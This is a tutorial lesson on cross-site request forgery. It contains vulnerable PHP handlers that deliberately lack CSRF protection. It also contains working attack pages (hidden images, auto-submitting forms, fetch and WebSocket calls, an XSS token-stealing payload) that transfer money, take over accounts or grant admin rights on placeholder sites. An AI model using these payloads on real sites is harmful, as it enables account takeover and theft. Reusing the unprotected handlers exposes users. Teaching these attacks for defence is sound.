# Lesson 05 - Understanding CSRF (Cross-Site Request Forgery) Attacks

**Duration**: 45-60 minutes

---

## Introduction: The Invisible Attack

Imagine this scenario:

1. You're logged into your bank account
2. You open another tab and visit a random website
3. That website makes your bank transfer $1000 to an attacker
4. You never clicked anything. You didn't even know it happened.

This is **Cross-Site Request Forgery (CSRF)**, and it's one of the most dangerous attacks because:
- It's invisible to users
- It bypasses authentication (you're already logged in)
- It can perform ANY action the user can perform

---

## What is CSRF?

**CSRF** (pronounced "sea-surf") is when an attacker tricks a victim's browser into making unwanted requests to a site where the victim is authenticated.

### The Key Insight

When you're logged into a website, your browser automatically sends your session cookie with **every request** to that site - even if the request comes from a different website.

```
User logged into bank.com → Cookie saved in browser
User visits evil.com → evil.com makes request to bank.com
Browser automatically attaches the cookie → Request succeeds!
```

The bank.com server sees:
- Valid session cookie ✓
- Authenticated user ✓
- Legitimate request format ✓

But the user never intended to make this request!

---

## How CSRF Attacks Work

### Simple Example: Automatic GET Request

```html
<!-- evil.com/page.html -->
<!DOCTYPE html>
<html>
<body>
    <h1>Cute Cat Pictures!</h1>

    <!-- Hidden image that makes a request -->
    <img src="https://bank.com/transfer?to=attacker&amount=1000" style="display:none;">

    <!-- User sees cats, attacker gets money -->
    <img src="cat1.jpg">
    <img src="cat2.jpg">
</body>
</html>
```

**What happens**:
1. User visits evil.com while logged into bank.com
2. Browser loads the hidden image
3. Browser makes GET request to `bank.com/transfer?to=attacker&amount=1000`
4. Browser **automatically** includes the session cookie
5. bank.com sees valid session and processes the transfer
6. User has no idea anything happened

### POST Request Example

```html
<!-- evil.com/attack.html -->
<!DOCTYPE html>
<html>
<body>
    <h1>Click to Win a Prize!</h1>

    <!-- Hidden form that auto-submits -->
    <form id="attack" action="https://bank.com/transfer" method="POST">
        <input type="hidden" name="to" value="attacker">
        <input type="hidden" name="amount" value="1000">
    </form>

    <script>
        // Auto-submit when page loads
        document.getElementById('attack').submit();
    </script>
</body>
</html>
```

**What happens**:
1. User clicks link (thinking they'll win something)
2. Page loads and JavaScript auto-submits the form
3. POST request goes to bank.com with session cookie
4. Transfer happens without user consent

### Ajax CSRF Example

```html
<!-- evil.com/modern-attack.html -->
<script>
// Modern CSRF using fetch
fetch('https://bank.com/api/transfer', {
    method: 'POST',
    credentials: 'include', // Include cookies
    headers: {
        'Content-Type': 'application/json'
    },
    body: JSON.stringify({
        to: 'attacker',
        amount: 1000
    })
});
</script>
```

**Note**: This might be blocked by CORS, but many sites have permissive CORS policies.

---

## Real-World CSRF Examples

### Example 1: Email Change

**Vulnerable code**:
```php
<?php
// change-email.php
session_start();

if (!isset($_SESSION['user_id'])) {
    die('Not logged in');
}

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $newEmail = $_POST['email'];

    // No CSRF protection!
    $db->query("UPDATE users SET email = ? WHERE id = ?",
        [$newEmail, $_SESSION['user_id']]);

    echo "Email changed successfully!";
}
?>

<form method="POST">
    <input type="email" name="email" required>
    <button type="submit">Change Email</button>
</form>
```

**Attack**:
```html
<!-- attacker.com/steal-account.html -->
<form id="hack" action="https://victim-site.com/change-email.php" method="POST">
    <input type="hidden" name="email" value="attacker@evil.com">
</form>

<script>
document.getElementById('hack').submit();
</script>
```

**Result**:
1. Victim visits attacker's page while logged in
2. Email is changed to attacker@evil.com
3. Attacker uses "forgot password" to take over account
4. Victim is locked out of their own account

### Example 2: Password Change

**Vulnerable code**:
```php
<?php
// change-password.php
session_start();

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $newPassword = $_POST['new_password'];

    // No current password check!
    // No CSRF protection!
    $hash = password_hash($newPassword, PASSWORD_DEFAULT);
    $db->query("UPDATE users SET password = ? WHERE id = ?",
        [$hash, $_SESSION['user_id']]);

    echo "Password changed!";
}
```

**Attack**:
```html
<form id="pwn" action="https://victim-site.com/change-password.php" method="POST">
    <input type="hidden" name="new_password" value="hacked123">
</form>

<script>
document.getElementById('pwn').submit();
</script>
```

**Result**: Attacker changes victim's password, takes over account.

### Example 3: Delete Account

**Vulnerable code**:
```php
<?php
// delete-account.php
session_start();

if (isset($_GET['confirm']) && $_GET['confirm'] === 'yes') {
    // No CSRF protection on this critical action!
    $db->query("DELETE FROM users WHERE id = ?", [$_SESSION['user_id']]);
    session_destroy();
    echo "Account deleted";
}
```

**Attack**:
```html
<!-- attacker.com -->
<img src="https://victim-site.com/delete-account.php?confirm=yes" style="display:none;">
```

**Result**: Victim's account is deleted just by visiting attacker's page.

### Example 4: Social Media CSRF

**Vulnerable code**:
```php
<?php
// follow.php
session_start();

$followUserId = $_GET['user_id'];

// No CSRF protection!
$db->query("INSERT INTO followers (user_id, following_id) VALUES (?, ?)",
    [$_SESSION['user_id'], $followUserId]);
```

**Attack**:
```html
<!-- attacker.com/get-followers.html -->
<img src="https://social-site.com/follow.php?user_id=attacker_id">
<img src="https://social-site.com/like.php?post_id=attacker_post">
<img src="https://social-site.com/share.php?post_id=attacker_post">
```

**Result**: Thousands of people unknowingly follow the attacker, like and share their posts.

### Example 5: Admin Actions

**Vulnerable code**:
```php
<?php
// admin/make-admin.php
session_start();

if ($_SESSION['is_admin'] !== true) {
    die('Admin only');
}

$userId = $_GET['user_id'];

// Admin is authenticated, but no CSRF protection!
$db->query("UPDATE users SET is_admin = 1 WHERE id = ?", [$userId]);
```

**Attack**:
```html
<!-- Attacker creates forum post with embedded image -->
<img src="https://victim-site.com/admin/make-admin.php?user_id=attacker_id">
```

**Result**: When admin views the forum post, attacker becomes admin too.

---

## Why CSRF is Dangerous

### 1. Invisible to Users

Users have no indication that an attack is happening:
- No alerts
- No confirmation dialogs
- No obvious malicious behavior
- Everything looks normal

### 2. Bypasses Authentication

The attack works because the user is **already logged in**:
- Session cookie is automatically sent
- Authentication passes
- Authorization checks pass (if based only on session)

### 3. Can Perform Any Action

If a user can do it, CSRF can do it:
- Transfer money
- Change email/password
- Delete data
- Create content
- Grant permissions
- Execute admin functions

### 4. Hard to Trace

After the attack:
- Logs show the user's IP address
- Logs show the user's session
- Looks like the user did it themselves
- Victim might not notice for days/weeks

---

## What Makes a Site Vulnerable to CSRF?

### Vulnerability Factors

A site is vulnerable if:

1. **Uses cookies for authentication** (most sites do)
2. **Processes state-changing requests** (POST, but also GET if misused)
3. **No CSRF protection mechanism** (no token validation)
4. **Predictable request format** (easy to forge)

### GET vs POST

**Common misconception**: "POST requests are safe from CSRF"

**Wrong!** POST requests are just as vulnerable:

```html
<!-- Auto-submitting POST form -->
<form id="csrf" action="https://bank.com/transfer" method="POST">
    <input type="hidden" name="to" value="attacker">
    <input type="hidden" name="amount" value="1000">
</form>
<script>document.getElementById('csrf').submit();</script>
```

**However**: POST is better than GET because:
- Can't exploit with simple `<img>` tags
- Requires JavaScript or form submission
- Some browsers show warnings when auto-submitting forms to different domains

**Best practice**: Never use GET for state-changing actions (delete, update, create).

---

## The Browser's Same-Origin Policy Doesn't Help

You might think: "Doesn't the browser prevent requests to other domains?"

**No!** The Same-Origin Policy prevents **reading** responses, not **making** requests:

```javascript
// This fails (can't READ response)
fetch('https://bank.com/api/account')
    .then(r => r.json())
    .then(data => console.log(data)); // Blocked by CORS!

// But this succeeds (can MAKE request)
fetch('https://bank.com/api/transfer', {
    method: 'POST',
    credentials: 'include',
    body: 'to=attacker&amount=1000'
}); // Request is sent! Attacker doesn't need to read response.
```

**Key point**: For CSRF, the attacker doesn't need to read the response. They just need the request to execute.

---

## CSRF vs XSS: What's the Difference?

Both are serious, but different:

### XSS (Cross-Site Scripting)
- **Goal**: Execute JavaScript in victim's browser
- **Location**: Malicious code runs on the vulnerable site
- **Visible**: Sometimes (popups, redirects, altered content)
- **Prevention**: Output encoding, CSP

### CSRF (Cross-Site Request Forgery)
- **Goal**: Make victim's browser send unwanted requests
- **Location**: Malicious code runs on attacker's site
- **Visible**: Never (completely invisible)
- **Prevention**: CSRF tokens, SameSite cookies

### Comparison Example

**XSS Attack**:
```
victim-site.com has XSS vulnerability
Attacker injects: <script>/* malicious code */</script>
Code executes on victim-site.com
Can access victim-site.com cookies, localStorage, etc.
```

**CSRF Attack**:
```
victim-site.com has no CSRF protection
Attacker hosts: evil.com with malicious form
Form submits to victim-site.com
Browser automatically includes victim-site.com cookies
```

### Can They Combine?

**Yes!** XSS can make CSRF much worse:

```javascript
// XSS payload that performs CSRF
fetch('/api/transfer', {
    method: 'POST',
    headers: {
        'Content-Type': 'application/json',
        // XSS can read DOM, including CSRF tokens!
        'X-CSRF-Token': document.querySelector('[name="csrf_token"]').value
    },
    body: JSON.stringify({to: 'attacker', amount: 1000})
});
```

If you have XSS, CSRF tokens don't help because the attacker can read the token from the page!

---

## CSRF Attack Vectors

### 1. Image Tags

```html
<img src="https://bank.com/transfer?to=attacker&amount=1000">
```

Works with GET requests. Loaded automatically.

### 2. Script Tags

```html
<script src="https://bank.com/api/delete-account?confirm=yes"></script>
```

Works with GET. Loaded automatically.

### 3. Auto-Submitting Forms

```html
<form id="csrf" action="https://bank.com/transfer" method="POST">
    <input type="hidden" name="to" value="attacker">
</form>
<script>document.getElementById('csrf').submit();</script>
```

Works with POST. Requires JavaScript.

### 4. Link Tags

```html
<link rel="stylesheet" href="https://bank.com/api/delete?id=123">
```

Works with GET. Loaded automatically.

### 5. Fetch/XMLHttpRequest

```javascript
fetch('https://bank.com/api/transfer', {
    method: 'POST',
    credentials: 'include',
    body: 'to=attacker&amount=1000'
});
```

Works with POST. May be blocked by CORS.

### 6. WebSocket

```javascript
var ws = new WebSocket('wss://bank.com/ws');
ws.onopen = function() {
    ws.send(JSON.stringify({action: 'transfer', to: 'attacker', amount: 1000}));
};
```

Works if WebSocket doesn't validate origin.

---

## Testing for CSRF Vulnerabilities

### Manual Testing Steps

1. **Identify state-changing actions**: Login, logout, profile update, delete, transfer, etc.
2. **Capture the request**: Use browser DevTools or Burp Suite
3. **Create a test HTML page**:

```html
<!-- csrf-test.html -->
<form id="test" action="https://target-site.com/action" method="POST">
    <input type="hidden" name="param1" value="value1">
    <input type="hidden" name="param2" value="value2">
</form>
<script>
document.getElementById('test').submit();
</script>
```

4. **Host the test page**: Use local server or upload to test domain
5. **Log into target site** in same browser
6. **Visit test page**: Does the action execute?
7. **Check result**: If action succeeded, site is vulnerable

### Automated Testing Tools

- **Burp Suite**: CSRF PoC Generator
- **OWASP ZAP**: CSRF testing
- **curl**: Manual request crafting

```bash
# Test if endpoint processes requests without CSRF token
curl -X POST https://example.com/api/transfer \
    -H "Cookie: session=YOUR_SESSION_COOKIE" \
    -d "to=attacker&amount=1000"
```

---

## When CSRF Protection is NOT Needed

CSRF protection is only needed for **state-changing actions** that rely on automatic authentication (cookies/sessions).

**Don't need CSRF protection**:
- Public endpoints (no authentication required)
- Read-only GET requests (if truly read-only)
- API endpoints that use token-based auth (Bearer tokens in headers)
- Actions that require something only the user has (like current password)

**Do need CSRF protection**:
- Login, logout
- Profile updates (email, password, settings)
- Create, update, delete operations
- Financial transactions
- Permission changes
- Any action that modifies state

---

## Key Takeaways

1. **CSRF tricks the browser** into making unwanted requests on behalf of authenticated users
2. **Completely invisible** - users don't know they're being attacked
3. **Bypasses authentication** - uses existing session cookies
4. **POST is vulnerable too** - not just GET requests
5. **Same-Origin Policy doesn't prevent CSRF** - only prevents reading responses
6. **Can perform any action** - transfers, deletes, changes, permissions
7. **Common and dangerous** - consistently in OWASP Top 10
8. **Different from XSS** - but can be combined for worse attacks

---

## What's Next?

Now that you understand how CSRF attacks work and why they're dangerous, the next lesson will teach you **how to prevent them**.

You'll learn:
- CSRF token generation and validation
- SameSite cookie attribute
- Double-submit cookie pattern
- Custom request headers
- Building a complete CSRF protection system

The prevention is actually straightforward - but you must implement it correctly and consistently!
